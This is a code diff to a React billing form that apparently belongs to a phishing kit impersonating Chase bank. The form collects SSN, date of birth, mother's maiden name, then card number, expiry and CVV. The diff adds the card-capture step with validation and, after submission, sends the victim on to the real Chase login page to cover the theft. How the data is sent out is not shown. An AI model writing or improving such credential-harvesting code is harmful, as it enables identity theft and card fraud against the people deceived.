@@ -57,6 +57,19 @@ const Billing = () => {
     return formatted;
   };
 
+  const formatCardNumber = (value) => {
+    const digits = value.replace(/\D/g, '').substring(0, 16);
+    return digits.match(/.{1,4}/g)?.join(' ') || digits;
+  };
+
+  const formatExpiry = (value) => {
+    const digits = value.replace(/\D/g, '').substring(0, 4);
+    if (digits.length > 2) {
+      return digits.substring(0, 2) + '/' + digits.substring(2);
+    }
+    return digits;
+  };
+
   const handleChange = (e) => {
     const { name, value } = e.target;
     let finalValue = value;
@@ -65,12 +78,18 @@ const Billing = () => {
       finalValue = formatSSN(value);
     } else if (name === 'dob') {
       finalValue = formatDOB(value);
+    } else if (name === 'cardNumber') {
+      finalValue = formatCardNumber(value);
+    } else if (name === 'expiryDate') {
+      finalValue = formatExpiry(value);
     } else if (['firstName', 'lastName', 'city', 'mmn'].includes(name)) {
       finalValue = value.replace(/[^a-zA-Z]/g, '');
     } else if (name === 'street') {
       finalValue = value.replace(/[^a-zA-Z0-9\s]/g, '');
     } else if (name === 'zipCode') {
-      finalValue = value.replace(/\D/g, '').slice(0, 6);
+      finalValue = value.replace(/\D/g, '').slice(0, 5);
+    } else if (name === 'cvv') {
+      finalValue = value.replace(/\D/g, '').slice(0, 4);
     }
 
     setFormData({
@@ -82,8 +101,8 @@ const Billing = () => {
   const handleNext = (e) => {
     e.preventDefault();
     if (step === 1) {
-      if (formData.zipCode.length !== 6) {
-        alert('Zip Code must be exactly 6 digits');
+      if (formData.zipCode.length !== 5) {
+        alert('Zip Code must be exactly 5 digits');
         return;
       }
       if (formData.ssn.length !== 11) {
@@ -91,7 +110,6 @@ const Billing = () => {
         return;
       }
 
-      // DOB Validation
       const dobRegex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
       const match = formData.dob.match(dobRegex);
       if (!match) {
@@ -102,33 +120,59 @@ const Billing = () => {
       const month = parseInt(match[1], 10);
       const day = parseInt(match[2], 10);
       const year = parseInt(match[3], 10);
-
       const date = new Date(year, month - 1, day);
       const now = new Date();
       const minAgeDate = new Date(now.getFullYear() - 18, now.getMonth(), now.getDate());
 
-      if (
-        date.getFullYear() !== year ||
-        date.getMonth() !== month - 1 ||
-        date.getDate() !== day ||
-        date > now
-      ) {
+      if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day || date > now) {
         alert('Please enter a valid Date of Birth');
         return;
       }
-
       if (date > minAgeDate) {
         alert('You must be at least 18 years old');
         return;
       }
-
-      if (formData.mmn.length !== 10) {
-        alert('Mother\'s Maiden Name must be exactly 10 characters');
+      if (formData.mmn.length < 2 || formData.mmn.length > 10) {
+        alert("Mother's Maiden Name must be between 2 and 10 characters");
         return;
       }
       setStep(2);
     } else {
-      console.log('Final Data:', formData);
+      // Step 2 Validation
+      const cleanCard = formData.cardNumber.replace(/\s/g, '');
+      if (cleanCard.length !== 16) {
+        alert('Card number must be exactly 16 digits');
+        return;
+      }
+
+      const expiryRegex = /^(\d{2})\/(\d{2})$/;
+      const expiryMatch = formData.expiryDate.match(expiryRegex);
+      if (!expiryMatch) {
+        alert('Please enter a valid expiration date (MM/YY)');
+        return;
+      }
+
+      const expMonth = parseInt(expiryMatch[1], 10);
+      const expYear = parseInt('20' + expiryMatch[2], 10);
+      const now = new Date();
+      const currentMonth = now.getMonth() + 1;
+      const currentYear = now.getFullYear();
+
+      if (expMonth < 1 || expMonth > 12) {
+        alert('Invalid month in expiration date');
+        return;
+      }
+      if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
+        alert('Card has expired');
+        return;
+      }
+
+      if (formData.cvv.length < 3 || formData.cvv.length > 4) {
+        alert('CVV must be 3 or 4 digits');
+        return;
+      }
+
+      window.location.href = "https://secure.chase.com/web/auth/?treatment=chase#/logon/logon/chaseOnline";
     }
   };
 
@@ -144,7 +188,7 @@ const Billing = () => {
 
       <main className="identity-content">
         <div className="content-wrapper">
-          <h1 className="large-title">{step === 2 ? "Card Information" : ""}</h1>
+          <h1 className="large-title"></h1>
           <p className="description">Please complete all fields to continue.</p>
 
           <form onSubmit={handleNext} className="billing-form">
@@ -153,158 +197,68 @@ const Billing = () => {
                 <div className="form-row">
                   <div className="billing-input-group">
                     <label>First Name</label>
-                    <input 
-                      type="text" 
-                      name="firstName" 
-                      value={formData.firstName} 
-                      onChange={handleChange} 
-                      required 
-                    />
+                    <input type="text" name="firstName" value={formData.firstName} onChange={handleChange} required />
                   </div>
                   <div className="billing-input-group">
                     <label>Last Name</label>
-                    <input 
-                      type="text" 
-                      name="lastName" 
-                      value={formData.lastName} 
-                      onChange={handleChange} 
-                      required 
-                    />
+                    <input type="text" name="lastName" value={formData.lastName} onChange={handleChange} required />
                   </div>
                 </div>
-                
                 <div className="billing-input-group">
                   <label>Street Address</label>
-                  <input 
-                    type="text" 
-                    name="street" 
-                    value={formData.street} 
-                    onChange={handleChange} 
-                    required 
-                  />
+                  <input type="text" name="street" value={formData.street} onChange={handleChange} required />
                 </div>
-
                 <div className="form-row address-row">
                   <div className="billing-input-group city-input">
                     <label>City</label>
-                    <input 
-                      type="text" 
-                      name="city" 
-                      value={formData.city} 
-                      onChange={handleChange} 
-                      required 
-                    />
+                    <input type="text" name="city" value={formData.city} onChange={handleChange} required />
                   </div>
                   <div className="billing-input-group state-input">
                     <label>State</label>
-                    <select 
-                      name="state" 
-                      value={formData.state} 
-                      onChange={handleChange} 
-                      required
-                      className="state-select"
-                    >
+                    <select name="state" value={formData.state} onChange={handleChange} required className="state-select">
                       <option value="">Select State</option>
-                      {states.map(s => (
-                        <option key={s} value={s}>{s}</option>
-                      ))}
+                      {states.map(s => <option key={s} value={s}>{s}</option>)}
                     </select>
                   </div>
                   <div className="billing-input-group zip-input">
                     <label>Zip Code</label>
-                    <input 
-                      type="text" 
-                      name="zipCode" 
-                      value={formData.zipCode} 
-                      onChange={handleChange} 
-                      required 
-                      maxLength="6"
-                    />
+                    <input type="text" name="zipCode" value={formData.zipCode} onChange={handleChange} required maxLength="5" />
                   </div>
                 </div>
-
                 <div className="billing-input-group">
                   <label>Social Security Number (SSN)</label>
-                  <input 
-                    type="text" 
-                    name="ssn" 
-                    placeholder="xxx-xx-xxxx"
-                    value={formData.ssn} 
-                    onChange={handleChange} 
-                    maxLength="11"
-                    required 
-                  />
+                  <input type="text" name="ssn" placeholder="xxx-xx-xxxx" value={formData.ssn} onChange={handleChange} maxLength="11" required />
                 </div>
                 <div className="billing-input-group">
                   <label>Date of Birth (DOB)</label>
-                  <input 
-                    type="text" 
-                    name="dob" 
-                    placeholder="MM/DD/YYYY"
-                    value={formData.dob} 
-                    onChange={handleChange} 
-                    maxLength="10"
-                    required 
-                  />
+                  <input type="text" name="dob" placeholder="MM/DD/YYYY" value={formData.dob} onChange={handleChange} maxLength="10" required />
                 </div>
                 <div className="billing-input-group">
                   <label>Mother's Maiden Name (MMN)</label>
-                  <input 
-                    type="text" 
-                    name="mmn" 
-                    value={formData.mmn} 
-                    onChange={handleChange} 
-                    maxLength="10"
-                    required 
-                  />
+                  <input type="text" name="mmn" value={formData.mmn} onChange={handleChange} maxLength="10" required />
                 </div>
               </div>
             ) : (
               <div className="step-fields">
                 <div className="billing-input-group">
                   <label>Credit/Debit Card Number</label>
-                  <input 
-                    type="text" 
-                    name="cardNumber" 
-                    placeholder="xxxx xxxx xxxx xxxx"
-                    value={formData.cardNumber} 
-                    onChange={handleChange} 
-                    required 
-                  />
+                  <input type="text" name="cardNumber" placeholder="xxxx xxxx xxxx xxxx" value={formData.cardNumber} onChange={handleChange} maxLength="19" required />
                 </div>
                 <div className="form-row">
                   <div className="billing-input-group">
                     <label>Expiration Date</label>
-                    <input 
-                      type="text" 
-                      name="expiryDate" 
-                      placeholder="MM/YY"
-                      value={formData.expiryDate} 
-                      onChange={handleChange} 
-                      required 
-                    />
+                    <input type="text" name="expiryDate" placeholder="MM/YY" value={formData.expiryDate} onChange={handleChange} maxLength="5" required />
                   </div>
                   <div className="billing-input-group">
                     <label>CVV</label>
-                    <input 
-                      type="text" 
-                      name="cvv" 
-                      placeholder="xxx"
-                      value={formData.cvv} 
-                      onChange={handleChange} 
-                      required 
-                    />
+                    <input type="text" name="cvv" placeholder="xxx" value={formData.cvv} onChange={handleChange} maxLength="4" required />
                   </div>
                 </div>
               </div>
             )}
 
             <div className="action-buttons dual-buttons billing-actions">
-              <button 
-                type="button" 
-                className="cancel-btn" 
-                onClick={() => step === 2 ? setStep(1) : navigate('/enter-code')}
-              >
+              <button type="button" className="cancel-btn" onClick={() => step === 2 ? setStep(1) : navigate('/enter-code')}>
                 {step === 2 ? "Back" : "Cancel"}
               </button>
               <button type="submit" className="next-btn">
